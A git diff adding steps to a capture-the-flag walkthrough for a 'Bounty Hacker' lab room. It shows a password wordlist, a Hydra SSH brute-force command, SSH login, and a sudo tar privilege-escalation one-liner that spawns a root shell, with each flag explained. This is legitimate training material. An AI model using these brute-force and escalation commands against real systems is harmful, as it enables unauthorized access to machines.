@@ -58,6 +58,10 @@ get locks.txt
 get task.txt
 ```
 
+### [BACK TO TOP](#bounty-hacker "Top Of Page")
+
+---
+
 ## Who wrote the task list?
 
 Reading the [task.txt](./Assets/task.txt "task.txt file") gives us the answer to this step.
@@ -69,14 +73,142 @@ Reading the [task.txt](./Assets/task.txt "task.txt file") gives us the answer to
 -lin
 ```
 
+### [BACK TO TOP](#bounty-hacker "Top Of Page")
+
+---
+
 ## What service can you bruteforce with the text file found?
+
+The other file we found [(locks.txt)](./Assets/locks.txt "locks.txt") was what looked like a password dictionary we could use for Lins SSH login.
+
+```txt
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+```
+
+Executing the following command in your terminal will [bruteforce the SSH](https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh "Article On SSH Brute Force") password for Lin using [Hydra](https://en.wikipedia.org/wiki/Hydra_(software) "Hydra Wikipedia").
+
+```bash
+hydra -l lin -P </path/to/wordlist> <IP ADDRESS> ssh
+```
 
 
 ## What is the users password?
 
+Use the [locks.txt](./Assets/locks.txt "Password Dictionary") file as the wordlist to Hydra. Brute force the SSH with "lin" as the username.
 
+### [BACK TO TOP](#bounty-hacker "Top Of Page")
+
+---
 
 ## user.txt
 
+Once you have the password SSH into lins account.
+
+```bash
+ssh lin@<IP Address>
+```
+
+Execute the following commands to list all files within the current directory.
+
+```bash
+ls -la
+```
+
+You should see the following output:
+
+* drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
+* drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
+* -rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
+
+Use the cat command to read the user.txt file where you'll find the flag.
+
+```bash
+cat user.txt
+```
+
+### [BACK TO TOP](#bounty-hacker "Top Of Page")
+
+---
 
 ## root.txt
+
+Now that we're in the system we need to escalate our priviliges to gain access to root and find the last flag.
+
+We can start by checking if the current user (lin) has any sudo priviliges. This can be done with the following command:
+
+```bash
+sudo -l
+```
+
+Which returns the following:
+
+* User lin may run the following commands on bountyhacker:
+    * (root) /bin/tar
+
+Looking up the [tar binary on GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo "GTFOBins Tar Entry") we see the following command for getting root privilege:
+
+"**sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh**"
+
+You should now be root. Verify this by using the following command:
+
+```bash
+whoami
+```
+
+Now to finish the room, run the following commands to find and read the flag file:
+
+```bash
+ls -la /root
+cat /root/root.txt
+```
+
+Breaking this down-
+
+If we lookup the help file on tar:
+
+```bash
+tar --help
+```
+
+We can find out what the -cf flag does:
+
+> tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.
+
+What the --checkpoint=1 flag does:
+
+> --checkpoint[=NUMBER]  display progress messages every NUMBERth record (default 10)
+
+And finally what the --checkpoint-action-=exec=/bin/sh flag does:
+
+> --checkpoint-action=ACTION   execute ACTION on each checkpoint
+
+We're using [tar](https://linuxhint.com/what-is-tar-file/ "Article On Tar Files") as sudo to create a tar from [/dev/null](https://linuxhint.com/what_is_dev_null/ "Article On Using /dev/null") to /dev/null and using the checkpoint action to [exec](https://phoenixnap.com/kb/linux-exec "Article On The Linux Exec Command") a shell and maintain the privilige.
+
+---
+
+### [BACK TO TOP](#bounty-hacker "Top Of Page")
